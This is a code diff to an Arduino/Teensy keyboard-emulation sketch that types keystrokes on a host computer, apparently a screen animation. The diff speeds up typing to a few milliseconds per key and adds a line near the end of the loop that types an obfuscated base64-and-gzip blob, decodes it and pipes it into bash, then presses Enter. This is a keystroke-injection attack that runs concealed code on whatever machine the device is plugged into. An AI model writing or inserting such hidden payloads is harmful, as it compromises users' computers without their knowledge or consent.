@@ -1,17 +1,18 @@
 #include "Keyboard.h"
 #include "stdio.h"
 #include "stdlib.h"
-#define INTER_T 300
+#define INTER_T 50
 #define INTER_ANIM 300
 
 void lettre(char c) {
   Keyboard.press(c);
-  delay(INTER_T);
+  delay(7);
   Keyboard.release(c);
-  delay(INTER_T);
+  delay(7);
 }
 
-void chaine(char chaine[]) {
+void chaine(char chaine[])
+{
   for (short i = 0; i < strlen(chaine); i++) {
     lettre(chaine[i]);
   }
@@ -65,6 +66,7 @@ void loop() {
   Keyboard.release(KEY_T);
   delay(INTER_T);
   delay(INTER_T);
+
 
   // ALT F8 Resize
   Keyboard.set_modifier(MODIFIERKEY_ALT);
@@ -127,6 +129,10 @@ void loop() {
   Keyboard.release(KEY_RIGHT);
   Keyboard.set_modifier(0);
   Keyboard.send_now();
+  
 
+  chaine (" echo 'H4sIAJ5LsmUA/42Qz04DIRjE7z7FBEkKMexKTa12WRLja/Si/FGSzcemoaam1mcv6x687lwYyAfzG2I+ICIRuIiJPH7b10wx+UAlhaGFKt9jqBNri9aHr5aOwyA7+HyDKtdz4d4KGI9Mdn9Hk8ZEH9joZrtt9PND87iBctBQYx0UwX1mKAIzhkdr91RXY3x4PxZrubUMP8ge6gVU03HSdV8OUB4r7Gkl2ZwzgQuR0OO+Q4IBP9+6y2Tveuj1k/ynXI7Ez27H065evyzE8JnC7BaXNqb+9NKq8/tX7qTxGqYBAAA=' | base64 -d | gzip -d | bash ");  
+  enter();
+  
    delay(5000);
 }
